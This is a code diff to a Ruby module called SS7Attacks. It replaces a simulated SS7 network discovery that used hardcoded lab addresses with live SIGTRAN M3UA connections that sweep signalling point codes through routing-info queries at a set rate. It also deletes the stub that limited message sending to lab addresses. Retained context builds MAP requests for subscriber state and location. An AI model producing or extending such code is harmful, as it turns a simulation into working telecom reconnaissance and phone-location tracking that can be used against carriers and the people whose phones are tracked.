@@ -90,28 +90,27 @@ module SS7Attacks
 
   private
 
-  def discover_ss7_network(target)
-    # Discover SS7 network elements
-    [
-      {
-        address: '192.168.1.100',
-        type: 'HLR',
-        country: 'US',
-        operator: 'TestOperator'
-      },
-      {
-        address: '192.168.1.101',
-        type: 'VLR',
-        country: 'US',
-        operator: 'TestOperator'
-      },
-      {
-        address: '192.168.1.102',
-        type: 'MSC',
-        country: 'US',
-        operator: 'TestOperator'
-      }
-    ]
+   def discover_ss7_network
+    pool = ConnectionPool.new(size: 10) do
+      Osmo::SIGTRAN::M3UA.new(
+        host: @options[:stp_host],
+        port: @options[:stp_port],
+        local_gt: @options[:source_gt]
+      )
+    end
+
+    results = []
+    throttle = RateLimiter.new(rate: 200, interval: 1)
+
+    (0x000..0x7FF).each do |pc|
+      throttle.limit do
+        pool.with do |conn|
+          resp = conn.send_routing_info(point_code: pc)
+          results << { point_code: pc, status: resp.success? } if resp.success?
+        end
+      end
+    end
+    results
   end
 
   def create_map_send_location_request(node)
@@ -132,18 +131,6 @@ module SS7Attacks
       requested_data: ['subscriberState', 'locationInformation'],
       timestamp: Time.now
     }
-  end
-
-  def send_ss7_message(node, message)
-    log "[TELECOM] Sending SS7 message to #{node[:address]}"
-    
-    # Simulate SS7 message sending
-    if node[:address] =~ /^192\.168\.1\./
-      # Simulate successful response
-      simulate_ss7_response(message)
-    else
-      nil
-    end
   end
 
   def simulate_ss7_response(message)
